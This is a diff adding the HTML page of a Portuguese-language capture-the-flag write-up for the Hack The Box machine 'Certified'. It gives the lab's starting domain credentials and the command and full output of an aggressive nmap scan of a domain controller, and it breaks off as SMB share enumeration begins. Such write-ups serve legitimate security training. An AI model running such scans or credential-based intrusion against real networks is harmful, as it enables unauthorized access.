@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr"
+    data-theme="dark"
+    data-layout="centered">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+  <meta name="generator" content="Hugo 0.168.0">
+  <meta name="generator-theme" content="Book Theme: https://github.com/alex-shpak/hugo-book">
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CertifiedReconNessa máquina começamos com o IP 10.10.11.41 e com as credenciais judith.mader:judith09 . Vamos começar mapeando a rede com nmap:
+# Nmap 7.94SVN scan initiated Sun Nov 10 17:03:33 2024 as: /usr/lib/nmap/nmap --privileged --min-rate=10000 -p- -A -oA nmap/certified 10.10.11.41 Nmap scan report for 10.10.11.41 Host is up (0.19s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-11 05:03:55Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-11T05:05:33&#43;00:00; &#43;7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-11T05:05:31&#43;00:00; &#43;7h00m00s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-11T05:05:33&#43;00:00; &#43;7h00m00s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-11T05:05:31&#43;00:00; &#43;7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49708/tcp open msrpc Microsoft Windows RPC 49732/tcp open msrpc Microsoft Windows RPC 50720/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-11-11T05:04:55 |_ start_date: N/A |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 192.70 ms 10.10.14.1 2 193.69 ms 10.10.11.41 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Nov 10 17:05:33 2024 -- 1 IP address (1 host up) scanned in 120.32 secondsSabemos agora que temos um servidor Windows com Active Directory operando, e podemos começar a testar a credencial que temos disponível.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark">
+<meta name="format-detection" content="telephone=no"><meta property="og:url" content="http://localhost:1313/docs/ctf/hack-the-box/machines/certified/">
+	<meta property="og:site_name" content="Portas">
+	<meta property="og:title" content="Portas">
+	<meta property="og:description" content="CertifiedReconNessa máquina começamos com o IP 10.10.11.41 e com as credenciais judith.mader:judith09 . Vamos começar mapeando a rede com nmap:
+# Nmap 7.94SVN scan initiated Sun Nov 10 17:03:33 2024 as: /usr/lib/nmap/nmap --privileged --min-rate=10000 -p- -A -oA nmap/certified 10.10.11.41 Nmap scan report for 10.10.11.41 Host is up (0.19s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-11 05:03:55Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-11T05:05:33&#43;00:00; &#43;7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-11T05:05:31&#43;00:00; &#43;7h00m00s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-11T05:05:33&#43;00:00; &#43;7h00m00s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-11T05:05:31&#43;00:00; &#43;7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49708/tcp open msrpc Microsoft Windows RPC 49732/tcp open msrpc Microsoft Windows RPC 50720/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-11-11T05:04:55 |_ start_date: N/A |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 192.70 ms 10.10.14.1 2 193.69 ms 10.10.11.41 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Nov 10 17:05:33 2024 -- 1 IP address (1 host up) scanned in 120.32 secondsSabemos agora que temos um servidor Windows com Active Directory operando, e podemos começar a testar a credencial que temos disponível.">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+
+
+	<meta itemprop="name" content="Portas">
+	<meta itemprop="description" content="CertifiedReconNessa máquina começamos com o IP 10.10.11.41 e com as credenciais judith.mader:judith09 . Vamos começar mapeando a rede com nmap:
+# Nmap 7.94SVN scan initiated Sun Nov 10 17:03:33 2024 as: /usr/lib/nmap/nmap --privileged --min-rate=10000 -p- -A -oA nmap/certified 10.10.11.41 Nmap scan report for 10.10.11.41 Host is up (0.19s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-11 05:03:55Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-11T05:05:33&#43;00:00; &#43;7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-11T05:05:31&#43;00:00; &#43;7h00m00s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-11T05:05:33&#43;00:00; &#43;7h00m00s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-11-11T05:05:31&#43;00:00; &#43;7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49708/tcp open msrpc Microsoft Windows RPC 49732/tcp open msrpc Microsoft Windows RPC 50720/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-11-11T05:04:55 |_ start_date: N/A |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 192.70 ms 10.10.14.1 2 193.69 ms 10.10.11.41 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Nov 10 17:05:33 2024 -- 1 IP address (1 host up) scanned in 120.32 secondsSabemos agora que temos um servidor Windows com Active Directory operando, e podemos começar a testar a credencial que temos disponível.">
+	<meta itemprop="wordCount" content="2479">
+
+<title>Certified • Portas</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.png" sizes="any">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/ctf/hack-the-box/machines/certified/">
+<link rel="stylesheet" href="/book.min.d2a63061af208ea46d4a5088bdb2c8d297df14bbb9064b630ae0b63dcb664760.css" integrity="sha256-0qYwYa8gjqRtSlCIvbLI0pffFLu5BktjCuC2PctmR2A=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.5d7d2e44f776c41b94da5c54f7df9ffe0ff698ce88fe3f1b3bd9e7b1f82ccae2.js" integrity="sha256-XX0uRPd2xBuU2lxU99&#43;f/g/2mM6I/j8bO9nnsfgsyuI=" crossorigin="anonymous"></script>
+  
+</head>
+
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <div class="book-container flex">
+    
+<aside class="book-menu" aria-label="Menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" role="searchbox" enterkeyhint="search"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results" aria-live="polite"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
+    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
+      <a role="button" class="">
+        Offensive Security</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
+    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
+      <a role="button" class="">
+        Initial Access</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
+      Remote Template Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6652e0280f4a0b30fa40b02437030f68" class="toggle" checked />
+    <label for="section-6652e0280f4a0b30fa40b02437030f68" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-58e18b116dcb674821e213ec0945416f" class="toggle" checked />
+    <label for="section-58e18b116dcb674821e213ec0945416f" class="flex">
+      <a role="button" class="">
+        Hack the Box</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-494dc92d9104717a20a45ff4de94fed4" class="toggle"  />
+    <label for="section-494dc92d9104717a20a45ff4de94fed4" class="flex">
+      <a role="button" class="">
+        Challenges (web)</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="">
+      Breaking Grad</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="">
+      Jerrytok</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="">
+      Templated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/toxic/" class="">
+      Toxic</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b358f1a871f27b6123c59716f1b3428c" class="toggle" checked />
+    <label for="section-b358f1a871f27b6123c59716f1b3428c" class="flex">
+      <a role="button" class="">
+        Machines</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/blurry/" class="">
+      Blurry</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/certified/" class="active">
+      Certified</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/cicada/" class="">
+      Cicada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="">
+      Monitorsthree</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c7059daadfdbaf53fa1366c3499caad7" class="toggle"  />
+    <label for="section-c7059daadfdbaf53fa1366c3499caad7" class="flex">
+      <a role="button" class="">
+        Juice Shop</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
+      Cross Site Scriping</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/injection/" class="">
+      Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/readme/" class="">
+      Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <header class="book-header hidden">
+      
+  <div class="flex align-center justify-between gap">
+  <input type="checkbox" class="toggle" id="menu-control" />
+  <label for="menu-control" aria-label="Menu">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#menu"></use></svg>
+  </label>
+
+  <div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+
+  
+  <input type="checkbox" class="toggle" id="toc-control" />
+  <label for="toc-control" aria-label="Table of Contents">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#toc"></use></svg>
+  </label>
+  
+</div>
+
+ 
+    </header>
+
+    <main class="book-page">
+      
+      
+  
+
+      
+  <article class="markdown book-article"><h1 id="certified">Certified<a class="anchor" href="#certified" aria-label="Link"></a></h1>
+<figure><img src="/assets/image%20%2827%29.png">
+</figure>
+
+<h2 id="recon">Recon<a class="anchor" href="#recon" aria-label="Link"></a></h2>
+<p>Nessa máquina começamos com o IP <code>10.10.11.41</code> e com as credenciais <code>judith.mader:judith09</code> . Vamos começar mapeando a rede com nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Sun Nov 10 17:03:33 2024 as: /usr/lib/nmap/nmap --privileged --min-rate=10000 -p- -A -oA nmap/certified 10.10.11.41</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.41
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.19s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65515</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-11-11 05:03:55Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-11T05:05:33+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-11T05:05:31+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-11T05:05:33+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-11T05:05:31+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49708/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49732/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>50720/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-11-11T05:04:55
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 53/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   192.70 ms 10.10.14.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   193.69 ms 10.10.11.41
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun Nov 10 17:05:33 2024 -- 1 IP address (1 host up) scanned in 120.32 seconds</span></span></span></code></pre></div><p>Sabemos agora que temos um servidor Windows com Active Directory operando, e podemos começar a testar a credencial que temos disponível.</p>
+<h3 id="smb">SMB<a class="anchor" href="#smb" aria-label="Link"></a></h3>
+<p>Começo listando os compartilhamentos do SMB com o usuário <code>judith.meder</code> que temos disponível:</p>
